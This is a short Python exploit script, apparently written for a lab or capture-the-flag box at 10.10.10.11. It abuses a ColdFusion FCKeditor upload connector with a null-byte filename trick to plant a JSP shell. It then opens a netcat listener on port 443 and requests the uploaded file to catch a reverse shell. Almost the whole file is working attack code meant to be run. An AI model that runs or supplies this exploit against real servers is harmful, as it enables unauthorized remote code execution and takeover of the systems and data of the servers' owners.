#!/usr/bin/python3

import requests
from subprocess import Popen
from bs4 import BeautifulSoup


ip = '10.10.10.11'
port = '8500'
url = 'http://'+ ip+':'+port +'/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/callme.jsp%00'

payload = {'newfile': ('shell.txt',open('shell.txt' ,'rb'),'application/xjava-archive')}

print('Please wait, sending exploit to:  ', ip +':'+port)
try:
    r = requests.post(url, files=payload,timeout=45)
    if r.ok:
        print('Success!')
        print('Shell is on the way...')
    else:
        print('Exploit failed!')
except:
    print('Connection timed out...')
    filesurl = 'http://'+ip+':'+port+'/userfiles/file'
    listfiles = requests.get(filesurl).text
    soup = BeautifulSoup(listfiles, 'html.parser')
    print(soup.get_text())
    print('Checking all the uploaded files')
    print('Did the payload upload?')
    quit()

Popen("terminator -T 'Catch the Shell' -e 'nc -nvl 443' ",shell=True)

callbackurl = 'http://'+ip+':'+port+'/userfiles/file/callme.jsp'
r2 = requests.get(callbackurl)
